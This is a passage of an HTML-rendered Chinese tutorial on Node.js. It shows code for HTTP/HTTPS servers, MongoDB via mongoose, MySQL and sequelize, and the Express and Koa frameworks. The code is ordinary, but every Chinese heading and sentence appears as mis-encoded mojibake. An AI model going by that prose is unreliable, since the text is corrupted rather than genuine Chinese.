å¯¹è±¡ï¼ˆè¡¨ç¤ºè¯·æ±‚ï¼‰å’Œ <code>res</code> å¯¹è±¡ï¼ˆè¡¨ç¤ºå“åº”ï¼‰ã€‚</p><p><strong>è·å–è¯·æ±‚çš„ URL å’Œæ–¹æ³•ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Requested URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request method: <span class="hljs-subst">$&#123;req.method&#125;</span>`</span>);<br><br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Hello, Node.js!&lt;/h1&gt;&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-2-3-ä½¿ç”¨-https-æ¨¡å—è¿›è¡Œå®‰å…¨é€šä¿¡"><a href="#4-2-3-ä½¿ç”¨-https-æ¨¡å—è¿›è¡Œå®‰å…¨é€šä¿¡" class="headerlink" title="4.2.3 ä½¿ç”¨ https æ¨¡å—è¿›è¡Œå®‰å…¨é€šä¿¡"></a>4.2.3 ä½¿ç”¨ <code>https</code> æ¨¡å—è¿›è¡Œå®‰å…¨é€šä¿¡</h4><p>ä½¿ç”¨ <code>https</code> æ¨¡å—å¯ä»¥åˆ›å»ºå®‰å…¨çš„ HTTPS æœåŠ¡å™¨ã€‚ä½ éœ€è¦æä¾› SSL è¯ä¹¦å’Œç§é’¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;https&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> options = &#123;<br>  <span class="hljs-attr">key</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private-key.pem&#x27;</span>),<br>  <span class="hljs-attr">cert</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;certificate.pem&#x27;</span>)<br>&#125;;<br><br>https.<span class="hljs-title function_">createServer</span>(options, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, HTTPS world!&#x27;</span>);<br>&#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">443</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="5-æ•°æ®åº“ä¸å­˜å‚¨-1"><a href="#5-æ•°æ®åº“ä¸å­˜å‚¨-1" class="headerlink" title="5. æ•°æ®åº“ä¸å­˜å‚¨"></a>5. æ•°æ®åº“ä¸å­˜å‚¨</h2><p>Node.js æ”¯æŒå¤šç§æ•°æ®åº“ï¼ŒåŒ…æ‹¬ NoSQLï¼ˆå¦‚ MongoDBï¼‰å’Œå…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚ MySQLï¼‰ã€‚</p><h3 id="5-1-ä½¿ç”¨-MongoDB"><a href="#5-1-ä½¿ç”¨-MongoDB" class="headerlink" title="5.1 ä½¿ç”¨ MongoDB"></a>5.1 ä½¿ç”¨ MongoDB</h3><p>MongoDB æ˜¯ä¸€ç§ NoSQL æ•°æ®åº“ï¼Œé€‚ç”¨äºå­˜å‚¨ JSON é£æ ¼çš„æ–‡æ¡£æ•°æ®ã€‚ä½¿ç”¨ <code>mongoose</code> åº“ï¼Œå¯ä»¥è½»æ¾è¿æ¥å’Œæ“ä½œ MongoDB æ•°æ®åº“ã€‚</p><h4 id="5-1-1-è¿æ¥åˆ°-MongoDB"><a href="#5-1-1-è¿æ¥åˆ°-MongoDB" class="headerlink" title="5.1.1 è¿æ¥åˆ° MongoDB"></a>5.1.1 è¿æ¥åˆ° MongoDB</h4><p>å®‰è£… <code>mongoose</code> å¹¶è¿æ¥åˆ° MongoDB æ•°æ®åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mongoose<br></code></pre></td></tr></table></figure><p><strong>è¿æ¥åˆ° MongoDBï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br>mongoose.<span class="hljs-title function_">connect</span>(<span class="hljs-string">&#x27;mongodb://localhost:27017/mydb&#x27;</span>, &#123; <span class="hljs-attr">useNewUrlParser</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">useUnifiedTopology</span>: <span class="hljs-literal">true</span> &#125;);<br><br><span class="hljs-keyword">const</span> db = mongoose.<span class="hljs-property">connection</span>;<br>db.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">console</span>, <span class="hljs-string">&#x27;Connection error:&#x27;</span>));<br>db.<span class="hljs-title function_">once</span>(<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MongoDB.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-1-2-CRUD-æ“ä½œ"><a href="#5-1-2-CRUD-æ“ä½œ" class="headerlink" title="5.1.2 CRUD æ“ä½œ"></a>5.1.2 CRUD æ“ä½œ</h4><p><strong>å®šä¹‰æ•°æ®æ¨¡å‹ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>åˆ›å»ºæ–°æ–‡æ¡£ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;);<br>user.<span class="hljs-title function_">save</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User saved.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æŸ¥è¯¢æ•°æ®ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">User</span>.<span class="hljs-title function_">find</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">err, users</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(users);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-1-3-ä½¿ç”¨-Mongoose-è¿›è¡Œæ•°æ®å»ºæ¨¡"><a href="#5-1-3-ä½¿ç”¨-Mongoose-è¿›è¡Œæ•°æ®å»ºæ¨¡" class="headerlink" title="5.1.3 ä½¿ç”¨ Mongoose è¿›è¡Œæ•°æ®å»ºæ¨¡"></a>5.1.3 ä½¿ç”¨ Mongoose è¿›è¡Œæ•°æ®å»ºæ¨¡</h4><p><code>Mongoose</code> æä¾›äº† Schema å®šä¹‰åŠŸèƒ½ï¼Œå¸®åŠ©æˆ‘ä»¬å¯¹ MongoDB æ•°æ®è¿›è¡Œå»ºæ¨¡ã€‚</p><p><strong>å®šä¹‰ Schemaï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> userSchema = <span class="hljs-keyword">new</span> mongoose.<span class="hljs-title class_">Schema</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span>,<br>  <span class="hljs-attr">email</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, userSchema);<br></code></pre></td></tr></table></figure><h3 id="5-2-ä½¿ç”¨-MySQL"><a href="#5-2-ä½¿ç”¨-MySQL" class="headerlink" title="5.2 ä½¿ç”¨ MySQL"></a>5.2 ä½¿ç”¨ MySQL</h3><p>MySQL æ˜¯ä¸€ç§å…³ç³»å‹æ•°æ®åº“ï¼ŒNode.js æä¾›äº†å¤šç§åº“æ¥è¿æ¥ MySQL æ•°æ®åº“ï¼Œå¦‚ <code>mysql</code>ã€<code>sequelize</code> ç­‰ã€‚</p><h4 id="5-2-1-è¿æ¥åˆ°-MySQL"><a href="#5-2-1-è¿æ¥åˆ°-MySQL" class="headerlink" title="5.2.1 è¿æ¥åˆ° MySQL"></a>5.2.1 è¿æ¥åˆ° MySQL</h4><p>å®‰è£… <code>mysql</code> åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mysql<br></code></pre></td></tr></table></figure><p><strong>è¿æ¥åˆ° MySQLï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br><br><span class="hljs-keyword">const</span> connection = mysql.<span class="hljs-title function_">createConnection</span>(&#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;password&#x27;</span>,<br>  <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;mydb&#x27;</span><br>&#125;);<br><br>connection.<span class="hljs-title function_">connect</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MySQL.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-2-2-æ‰§è¡Œ-SQL-æŸ¥è¯¢"><a href="#5-2-2-æ‰§è¡Œ-SQL-æŸ¥è¯¢" class="headerlink" title="5.2.2 æ‰§è¡Œ SQL æŸ¥è¯¢"></a>5.2.2 æ‰§è¡Œ SQL æŸ¥è¯¢</h4><p><strong>æ‰§è¡Œ SELECT æŸ¥è¯¢ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ‰§è¡Œ INSERT æŸ¥è¯¢ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> &#125;;<br>connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;INSERT INTO users SET ?&#x27;</span>, user, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User added.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-2-3-ä½¿ç”¨-sequelize-è¿›è¡Œ-ORM-æ˜ å°„"><a href="#5-2-3-ä½¿ç”¨-sequelize-è¿›è¡Œ-ORM-æ˜ å°„" class="headerlink" title="5.2.3 ä½¿ç”¨ sequelize è¿›è¡Œ ORM æ˜ å°„"></a>5.2.3 ä½¿ç”¨ <code>sequelize</code> è¿›è¡Œ ORM æ˜ å°„</h4><p><code>sequelize</code> æ˜¯ Node.js ä¸­å¸¸ç”¨çš„ ORM å·¥å…·ï¼Œæ”¯æŒ MySQLã€PostgreSQLã€SQLite ç­‰æ•°æ®åº“ã€‚</p><p>å®‰è£… <code>sequelize</code> å’Œ MySQL é©±åŠ¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install sequelize mysql2<br></code></pre></td></tr></table></figure><p><strong>å®šä¹‰æ¨¡å‹å¹¶åŒæ­¥æ•°æ®åº“ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">Sequelize</span>, <span class="hljs-title class_">DataTypes</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sequelize&#x27;</span>);<br><span class="hljs-keyword">const</span> sequelize = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sequelize</span>(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, &#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">dialect</span>: <span class="hljs-string">&#x27;mysql&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = sequelize.<span class="hljs-title function_">define</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">STRING</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;,<br>  <span class="hljs-attr">age</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">INTEGER</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;<br>&#125;);<br><br>sequelize.<span class="hljs-title function_">sync</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Database synced.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="6-Web-å¼€å‘ä¸æ¡†æ¶-1"><a href="#6-Web-å¼€å‘ä¸æ¡†æ¶-1" class="headerlink" title="6. Web å¼€å‘ä¸æ¡†æ¶"></a>6. Web å¼€å‘ä¸æ¡†æ¶</h2><p>Node.js æ˜¯å¼€å‘ Web åº”ç”¨çš„çƒ­é—¨é€‰æ‹©ï¼Œå¸¸ç”¨çš„ Web æ¡†æ¶åŒ…æ‹¬ <strong>Express</strong> å’Œ <strong>Koa</strong>ã€‚</p><h3 id="6-1-ä½¿ç”¨-Express-æ¡†æ¶"><a href="#6-1-ä½¿ç”¨-Express-æ¡†æ¶" class="headerlink" title="6.1 ä½¿ç”¨ Express æ¡†æ¶"></a>6.1 ä½¿ç”¨ Express æ¡†æ¶</h3><p><code>Express</code> æ˜¯æœ€æµè¡Œçš„ Node.js Web æ¡†æ¶ï¼Œç®€åŒ–äº†è·¯ç”±å¤„ç†ã€è¯·æ±‚å¤„ç†å’Œä¸­é—´ä»¶ç®¡ç†ã€‚</p><h4 id="6-1-1-åˆ›å»ºåŸºæœ¬çš„-Express-åº”ç”¨"><a href="#6-1-1-åˆ›å»ºåŸºæœ¬çš„-Express-åº”ç”¨" class="headerlink" title="6.1.1 åˆ›å»ºåŸºæœ¬çš„ Express åº”ç”¨"></a>6.1.1 åˆ›å»ºåŸºæœ¬çš„ Express åº”ç”¨</h4><p>å®‰è£… <code>Express</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure><p><strong>åˆ›å»ºç®€å•çš„ Express åº”ç”¨ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello, Express!&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-2-è·¯ç”±ä¸ä¸­é—´ä»¶"><a href="#6-1-2-è·¯ç”±ä¸ä¸­é—´ä»¶" class="headerlink" title="6.1.2 è·¯ç”±ä¸ä¸­é—´ä»¶"></a>6.1.2 è·¯ç”±ä¸ä¸­é—´ä»¶</h4><p><strong>å®šä¹‰è·¯ç”±ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`User ID: <span class="hljs-subst">$&#123;req.params.id&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ä¸­é—´ä»¶ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-3-å¤„ç†è¡¨å•å’Œ-JSON-æ•°æ®"><a href="#6-1-3-å¤„ç†è¡¨å•å’Œ-JSON-æ•°æ®" class="headerlink" title="6.1.3 å¤„ç†è¡¨å•å’Œ JSON æ•°æ®"></a>6.1.3 å¤„ç†è¡¨å•å’Œ JSON æ•°æ®</h4><p><code>Express</code> å¯ä»¥ä½¿ç”¨ <code>express.urlencoded()</code> å’Œ <code>express.json()</code> ä¸­é—´ä»¶æ¥å¤„ç†è¡¨å•æ•°æ®å’Œ JSON æ•°æ®ã€‚</p><p><strong>å¤„ç† JSON æ•°æ®ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/submit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Data received.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-4-é”™è¯¯å¤„ç†"><a href="#6-1-4-é”™è¯¯å¤„ç†" class="headerlink" title="6.1.4 é”™è¯¯å¤„ç†"></a>6.1.4 é”™è¯¯å¤„ç†</h4><p>å®šä¹‰é”™è¯¯å¤„ç†ä¸­é—´ä»¶ï¼Œæ•è·è·¯ç”±å’Œä¸­é—´ä»¶ä¸­çš„é”™è¯¯ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> &#123;<br><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="6-2-ä½¿ç”¨-Koa-æ¡†æ¶"><a href="#6-2-ä½¿ç”¨-Koa-æ¡†æ¶" class="headerlink" title="6.2 ä½¿ç”¨ Koa æ¡†æ¶"></a>6.2 ä½¿ç”¨ Koa æ¡†æ¶</h3><p><code>Koa</code> æ˜¯ç”± Express çš„åŸå§‹å›¢é˜Ÿè®¾è®¡çš„æ–°ä¸€ä»£ Web æ¡†æ¶ï¼ŒåŸºäºä¸­é—´ä»¶çš„åŠŸèƒ½æ›´å¼ºå¤§ã€æ›´çµæ´»ã€‚</p><h4 id="6-2-1-Koa-çš„ç‰¹ç‚¹ä¸-Express-å¯¹æ¯”"><a href="#6-2-1-Koa-çš„ç‰¹ç‚¹ä¸-Express-å¯¹æ¯”" class="headerlink" title="6.2.1 Koa çš„ç‰¹ç‚¹ä¸ Express å¯¹æ¯”"></a>6.2.1 Koa çš„ç‰¹ç‚¹ä¸ Express å¯¹æ¯”</h4><ul><li><strong>æ›´ç°ä»£åŒ–</strong>ï¼šKoa ä½¿ç”¨ ES6 <code>async/await</code> å¤„ç†å¼‚æ­¥æ“ä½œï¼Œç®€åŒ–äº†ä»£ç é€»è¾‘ã€‚</li><li><strong>ä¸­é—´ä»¶è®¾è®¡</strong>ï¼šKoa çš„ä¸­é—´ä»¶æ›´åŠ çµæ´»ï¼Œå¼€å‘è€…å¯ä»¥å®Œå…¨æ§åˆ¶å“åº”æµç¨‹ã€‚</li></ul><h4 id="6-2-2-åˆ›å»º-Koa-åº”ç”¨"><a href="#6-2-2-åˆ›å»º-Koa-åº”ç”¨" class="headerlink" title="6.2.2 åˆ›å»º Koa åº”ç”¨"></a>6.2.2 åˆ›å»º Koa åº”ç”¨</h4><p>å®‰è£… <code>Koa</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install koa<br></code></pre></td></tr></table></figure><p><strong>åˆ›å»ºåŸºæœ¬ Koa åº”ç”¨ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Hello, Koa!&#x27;</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-2-3-ä¸­é—´ä»¶ä¸è·¯ç”±å¤„ç†"><a href="#6-2-3-ä¸­é—´ä»¶ä¸è·¯ç”±å¤„ç†" class="headerlink" title="6.2.3 ä¸­é—´ä»¶ä¸è·¯ç”±å¤„ç†"></a>6.2.3 ä¸­é—´ä»¶ä¸è·¯ç”±å¤„ç†</h4><p><strong>å®šä¹‰ä¸­é—´ä»¶ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx, next) =&gt; &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;ctx.url&#125;</span>`</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å¤„ç†è·¯ç”±ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 